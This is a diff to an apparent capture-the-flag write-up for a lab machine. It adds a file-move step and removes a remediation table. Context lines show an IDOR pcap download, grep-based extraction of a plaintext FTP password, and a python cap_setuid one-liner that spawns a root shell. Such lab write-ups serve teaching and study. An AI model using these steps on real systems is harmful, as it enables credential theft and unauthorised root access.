@@ -140,7 +140,18 @@ This data concentration validated that a historical session capture had been suc
 
 *Figure 10: Verification of the downloaded 0.pcap data container within the attacking local environment.*
 
-The presence of the authentic **`0.pcap`** storage container inside the local system environment confirms successful data theft, providing the specific traffic trace files needed to perform analytical credential harvesting.
+#### Local Workspace Consolidation
+To maintain a strict and cohesive testing workflow, exfiltrated files must be moved out of generic system directories. The downloaded storage container was consolidated by transferring it from the main host download directory into the dedicated local repository subfolder (`~/cap/content/`) utilizing the native `mv` command.
+
+```bash
+mv /home/kali/Downloads/0.pcap .
+```
+
+![Local Workspace Consolidation Command](./assets/mv_aclaracion.png)
+
+*Figure 11: File relocation via the mv command to consolidate target resources within the operational workspace.*
+
+This file transfer confirms operational data centralisation, ensuring the intercepted packet capture traces can be smoothly investigated locally for cleartext information.
 
 #### IDOR Boundary Exploitation & Credential Harvesting
 - **Credential Extraction:** `strings 0.pcap | grep -E "USER|PASS"` → `nathan:Buck3tH4TF0RM3!`
@@ -151,14 +162,4 @@ The presence of the authentic **`0.pcap`** storage container inside the local sy
 - **Enumeration:** `getcap -r / 2>/dev/null | grep python` → `/usr/bin/python3.8 = cap_setuid+ep`
 - **Exploitation:** `python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'`
 - **Root Confirmation:** `whoami` → `root`
-- **Flag:** `cat /root/root.txt` → `05e335171411e72ea02cbed2e5686331`
-
----
-
-## 🛡️ Remediation & Hardening
-
-| Vulnerability | Root Cause | Recommended Fix |
-| :--- | :--- | :--- |
-| **IDOR on `/download/`** | Sequential numeric IDs without session validation. | Use UUIDs (e.g., `/download/uuid`), enforce user authentication, and validate permissions server-side. |
-| **FTP Credentials in PCAP** | Exposing internal packet captures to unauthenticated users. | Restrict PCAP access to administrators. Disable FTP; use SFTP with key-based authentication. |
 
